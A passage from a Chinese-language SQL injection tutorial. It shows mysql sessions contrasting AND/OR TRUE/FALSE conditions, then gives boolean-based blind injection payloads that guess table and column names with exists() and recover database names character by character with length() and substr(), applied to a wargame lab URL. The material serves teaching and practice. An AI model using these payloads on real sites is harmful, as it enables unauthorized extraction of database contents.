						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c326d965948521-1">
<span class="crayon-v">mysql</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e ">SELECT *</span><span class="crayon-h"> </span><span class="crayon-e">from </span><span class="crayon-e">students </span><span class="crayon-e">where </span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">10056</span><span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-t">TRUE</span><span class="crayon-h"> </span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c326d965948521-2">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c326d965948521-3">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">id</span><span class="crayon-h">    </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-h">  </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">age</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c326d965948521-4">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c326d965948521-5">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-cn">10056</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Doris</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">  </span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c326d965948521-6">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c326d965948521-7">
<span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">row </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">set</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0.00</span><span class="crayon-h"> </span><span class="crayon-v">sec</span><span class="crayon-sy">)</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0022 seconds] -->
<p>4)</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3270907689295" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
mysql&gt; select * from students where id = 10056 and FALSE ;
Empty set (0.00 sec)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3270907689295-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3270907689295-2">2</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3270907689295-1">
<span class="crayon-v">mysql</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e ">select *</span><span class="crayon-h"> </span><span class="crayon-e">from </span><span class="crayon-e">students </span><span class="crayon-e">where </span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">10056</span><span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-t">FALSE</span><span class="crayon-h"> </span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3270907689295-2">
<span class="crayon-e">Empty </span><span class="crayon-e">set</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0.00</span><span class="crayon-h"> </span><span class="crayon-v">sec</span><span class="crayon-sy">)</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p>5)</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3273940410866" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
mysql&gt; selcet * from students where id = 10056 or TRUE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
| 10058 | Jaune |  22 |
| 10060 | Alisa |  29 |
+-------+-------+-----+
3 rows in set (0.00 sec)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3273940410866-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3273940410866-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c3273940410866-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3273940410866-4">4</div>
<div class="crayon-num" data-line="crayon-587a9554c3273940410866-5">5</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3273940410866-6">6</div>
<div class="crayon-num" data-line="crayon-587a9554c3273940410866-7">7</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3273940410866-8">8</div>
<div class="crayon-num" data-line="crayon-587a9554c3273940410866-9">9</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3273940410866-1">
<span class="crayon-v">mysql</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e ">selcet *</span><span class="crayon-h"> </span><span class="crayon-e">from </span><span class="crayon-e">students </span><span class="crayon-e">where </span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">10056</span><span class="crayon-h"> </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-t">TRUE</span><span class="crayon-h"> </span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3273940410866-2">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3273940410866-3">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">id</span><span class="crayon-h">    </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-h">  </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">age</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3273940410866-4">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3273940410866-5">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-cn">10056</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Doris</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">  </span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3273940410866-6">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-cn">10058</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Jaune</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">  </span><span class="crayon-cn">22</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3273940410866-7">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-cn">10060</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Alisa</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">  </span><span class="crayon-cn">29</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3273940410866-8">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3273940410866-9">
<span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-e">rows </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">set</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0.00</span><span class="crayon-h"> </span><span class="crayon-v">sec</span><span class="crayon-sy">)</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0025 seconds] -->
<p>6)</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3275707838647" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
mysql&gt; select * from students where id = 10056 or FALSE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
+-------+-------+-----+
1 row in set (0.00 sec)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3275707838647-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3275707838647-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c3275707838647-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3275707838647-4">4</div>
<div class="crayon-num" data-line="crayon-587a9554c3275707838647-5">5</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3275707838647-6">6</div>
<div class="crayon-num" data-line="crayon-587a9554c3275707838647-7">7</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3275707838647-1">
<span class="crayon-v">mysql</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e ">select *</span><span class="crayon-h"> </span><span class="crayon-e">from </span><span class="crayon-e">students </span><span class="crayon-e">where </span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">10056</span><span class="crayon-h"> </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-t">FALSE</span><span class="crayon-h"> </span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3275707838647-2">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3275707838647-3">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">id</span><span class="crayon-h">    </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-h">  </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">age</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3275707838647-4">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3275707838647-5">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-cn">10056</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Doris</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">  </span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3275707838647-6">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3275707838647-7">
<span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">row </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">set</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0.00</span><span class="crayon-h"> </span><span class="crayon-v">sec</span><span class="crayon-sy">)</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0020 seconds] -->
<p></p>
<div>
<p><strong>会发现and 1=1 , and 1=2 即是 and TRUE , and FALSE 的变种。</strong><br>
<strong>这便是最基础的boolean注入,以此为基础你可以自由组合语句。</strong></p>
<p>字典爆破流</p>
<figure></figure>
<p></p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3278371389065" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
and exists(select * from ?)     //?为猜测的表名
and exists(select ? from x)     //?为猜测的列名</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3278371389065-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3278371389065-2">2</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3278371389065-1">
<span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-e">exists</span><span class="crayon-sy">(</span><span class="crayon-e ">select *</span><span class="crayon-h"> </span><span class="crayon-i">from</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-sy">)</span><span class="crayon-h">     </span><span class="crayon-c">//?为猜测的表名</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3278371389065-2">
<span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-e">exists</span><span class="crayon-sy">(</span><span class="crayon-i">select</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-i">from</span><span class="crayon-h"> </span><span class="crayon-v">x</span><span class="crayon-sy">)</span><span class="crayon-h">     </span><span class="crayon-c">//?为猜测的列名</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p>截取二分流</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c327b588908800" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
and (length((select schema_name from information_schema.schemata limit 1))&gt;?)       //判断数据库名的长度
and (substr((select schema_name from information_schema.schemata limit 1),1,1)&gt;'?')
and (substr((select schema_name from information_schema.schemata limit 1),1,1)&lt;'?')      //利用二分法判断第一个字符</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c327b588908800-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c327b588908800-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c327b588908800-3">3</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c327b588908800-1">
<span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">length</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-e">select </span><span class="crayon-e">schema_name </span><span class="crayon-e">from </span><span class="crayon-v">information_schema</span><span class="crayon-sy">.</span><span class="crayon-e">schemata </span><span class="crayon-i">limit</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-o">&gt;</span><span class="crayon-sy">?</span><span class="crayon-sy">)</span><span class="crayon-h">       </span><span class="crayon-c">//判断数据库名的长度</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c327b588908800-2">
<span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-e">select </span><span class="crayon-e">schema_name </span><span class="crayon-e">from </span><span class="crayon-v">information_schema</span><span class="crayon-sy">.</span><span class="crayon-e">schemata </span><span class="crayon-i">limit</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-o">&gt;</span><span class="crayon-s">'?'</span><span class="crayon-sy">)</span>
</div>
<div class="crayon-line" id="crayon-587a9554c327b588908800-3">
<span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-e">select </span><span class="crayon-e">schema_name </span><span class="crayon-e">from </span><span class="crayon-v">information_schema</span><span class="crayon-sy">.</span><span class="crayon-e">schemata </span><span class="crayon-i">limit</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-o">&lt;</span><span class="crayon-s">'?'</span><span class="crayon-sy">)</span><span class="crayon-h">      </span><span class="crayon-c">//利用二分法判断第一个字符</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0016 seconds] -->
<p></p>
<h3 id="Boolean-based总结">Boolean-based总结</h3>
<p>根据前面的介绍，我们知道，对于基于Boolean-based的注入，<strong>必须要有一个可以正常访问的地址</strong>，比如http: //redtiger.labs.overthewire.org/level4.php?id=1 是一个可以正常访问的记录，说明id=1的记录是存在的，下面的都是基于这个进一步猜测。先来判断一个关键字keyword的长度，在后面构造<strong>id=1 and (select length(keyword) from table)=1</strong>，从服务器我们会得到一个返回值，如果和先前的返回值不一样，说明and后面的<strong>(select length(keyword) from table)=1返回false</strong>，keyword的长度不等于1。继续构造直到id=1 and (select length(keyword) from table)=15返回true，说明keyword的长度为15。</p>
<p><strong>为什么我们刚开始一定要找一个已经存在的id，其实这主要是为了构造一个为真的情况。Boolean-based就是利用查询结果为真和为假时的不同响应，通过不断猜测来找到自己想要的东西。</strong></p>
<p>对于keyword的值，mysql数据库可以使用substr(string, start, length)函数，截取string从第start位开始的length个字符串id=1 and (select substr(keyword,1,1) from table) =’A’，依此类推，就可以获得keyword的在数据库中的值。<br>
Boolean-based的效率很低，需要多个请求才能确定一个值，尽管这种代价可以通过脚本来完成，在有选择的情况下，我们会优先选择其他方式。</p>
<h2 id="Error-Based-原理分析">Error Based 原理分析</h2>
<h3 id="关于错误回显">关于错误回显</h3>
<p>基于错误回显的sql注入就是<strong>通过sql语句的矛盾性来使数据被回显到页面上</strong>。</p>
<p>所用到的函数</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c327f284791344" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
